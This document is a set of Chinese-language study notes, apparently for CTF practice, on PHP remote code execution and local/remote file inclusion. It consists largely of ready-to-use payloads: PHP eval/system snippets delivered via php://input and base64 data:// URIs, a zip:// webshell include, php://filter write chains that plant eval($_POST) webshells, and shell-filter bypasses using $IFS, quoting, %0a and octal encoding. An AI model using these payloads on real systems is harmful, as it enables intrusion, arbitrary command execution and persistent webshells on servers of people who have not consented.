
RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统

## 文件包含

文件源代码中有include函数，将会解析所含文件，然后再将其执行

文件包含漏洞可以分为LFl (Local File Inclusion本地文件包含)和RFI(Remote File Inclusion，远程文件包含）两种。而区分二者最简单的办法就是通过查看php.ini中是否开启了allow_url_include。如果开启就有可能包含远程文件。

远程文件包含需要php.ini中allow_url_include=on, allow_url_fopen = on。在php.ini中，allow_url_fopen默认一直是on，而allow_url_include从php5.2之后就默认为Off。

allow_url_fopen参数（只影响RFI，不影响LFI）

简介：是否允许将URL（HTTP，HTTPS等）作为文件打开处理

allow_url_include参数（只影响RFI，不影响LFI）
简介：是否允许includeI()和require()函数包含URL（HTTP，HTTPS）作为文件处理

**将以下示例设法放入include中**

**php://input**
是个可以访问请求的原始数据的只读流。可以接收post请求作为输入流的输入，将请求作为PHP代码的输入传递给目标变量，以达到以post的形式进行输入的目的

data为
```
<?php eval("system('ls');")?>
```

 **php://filter**
php://filter可以作为一个中间流来处理其他流。

**data://**
 ```
data://,<?phpprint_r(scandir(/var/www));?>

?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==

?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCJkaXIiKTs/Pg==

使用base64时，不能出现加号，需要换函数执行

```

# zip://
当我们上传一个zip文件至服务器，当通过zip://协议解析这个压缩文件，索引到某个文件
```
?fp=zip://uploads/xxxx.png%231&shell=phpinfo();

xxx.png(zipfile)
- 1.php(phpfile) => "<php? eval($_GET['shell']);?>"
```
 
名称	                                            描述
resource=<要过滤的数据流>	这个参数是必须的。它指定了你要筛选过滤的数据流。
read=<读链的筛选列表>	该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。
write=<写链的筛选列表>	该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。
<；两个链的筛选列表>	任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。


使用实例

解码：
```
php://filter/read=convert.base64-encode/resource=flag.php（.php根据实际情况添加)

php://filter/read=string.strip_tags/resource=php://input

php://filter/read=string.rot13/resource=flag.php

php://filter/read=string.toupper/resource=flag.php

php://filter/read=string.tolower/resource=flag.php
```

写码绕过：
```
?filename=php://filter/convert.base64-decode/resource=1.php&content=aPD9waHAgZXZhbCgkX1BPU1RbYV0pOw==

(base64字段为<?php exit; ?>)

?filename=php://filter/write=string.rot13/resource=2.php&content=<?cuc riny($_CBFG[n]);

?filename=php://filter/write=string.strip_tags|convert.base64-decode/resource=3.php&content=?>PD9waHAgZXZhbCgkX1BPU1RbYV0pOw==

```

##### convert.\*过滤器
```
?filename=php://filter/convert.iconv.a.b/resource=check.php
(对a，b进行爆破，)

例如：
convert.iconv.UCS-4*.UCS-4BE   --->  将指定的文件从UCS-4*转换为UCS-4BE 输出
```

**日志**
[日志中的文件包含](./日志.md)

## 常见文件
show.php、upload.php、home.php

# 绕过

```
当cat被过滤时，可以通过双引号、单引号、shell特殊字符绕过
例如：ca""t , ca''t , ca$@t,ca\t  /bin/c?? c?t（通配符）

或
more ./*|grep fla
more:一页一页的显示档案内容

less:与 more 类似 head:查看头几行

tac:从最后一行开始显示，可以看出 tac 是cat 的反向显示

tail:查看尾几行

nl：显示的时候，顺便输出行号

od:以二进制的方式读取档案内容

vi:一种编辑器，这个也可以查看
vim:一种编辑器，这个也可以查看

sort:可以查看

uniq:可以查看 file -f:报错出具体内容 

grep
在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令： grep test *file strings

mv :移动文件到txt之类的其他文件，直接访问即可

```

```
当空格被过滤时，可以尝试用以下字符替代

< 、<>、%20(space)、%09(tab)、$IFS$9、{cat,fl*}、 ${IFS}、$IFS等

`$IFS`在linux下表示分隔符，但是如果单纯的`cat $IFS2`，bash解释器会把整个IFS2当做变量名，所以导致输不出来结果，因此这里加一个{}就固定了变量名。
同理，在后面加个$可以起到截断的作用，使用$9是因为它是当前系统shell进程的第九个参数的持有者，它始终为空字符串
```

```
当正斜杠和反斜杠都被过滤时，可以通过不断cd进入目录，然后再cat

当所有管道符被过滤时，可以在url地址栏中输入，分号可以用%0a代替，空格可以用%09代替

%0a 是 换行符 (\x0a)
%09 是 TAB键  (\x09)
```

```
八进制ascii码绕过

将字符串全部转换为ascii码

str1=input('请输入字符串：')  
for i in str1:  
    print('\\'+str(oct(ord(i)))[2:],end='')
```

**字符串截断**
```
include($c.".php");对伪协议没有影响，照样可以用data://,<?php ?>进行闭包

用%00 截断(php<5.3.4)

用垃圾字符 . / 进行截断（php版本小于5.2.8）

用? 截断(allow_url_fopen On    allow_url_include On)
```

```
ca$@t${IFS}`find\

find 查看当前及子目录下的所有文件

直接配合内联执行引用find命令特性，然后使用cat查看find列出的文件即可，因为flag就在当前目录
```

## php://input伪协议绕过strstr()函数 
php://input是php语言中一个只读的数据流；通过"php://input"，可以读取从Http客户端以POST方式提交、请求头“Content-Type”值非"multipart/form-data"的所有数据；"php://input"一般用来读取POST上来，除已被处理以外的剩余数据。
因为strstr()函数对大小写敏感，也就是字符串中必须要出现"php://"才会生效，page=PHP://input之类的大写的字母是就可以绕过strstr()函数：把PHP://input的值通过GET方式传入，然后通过POST方式提交执行的命令读取目录文件ls、dir：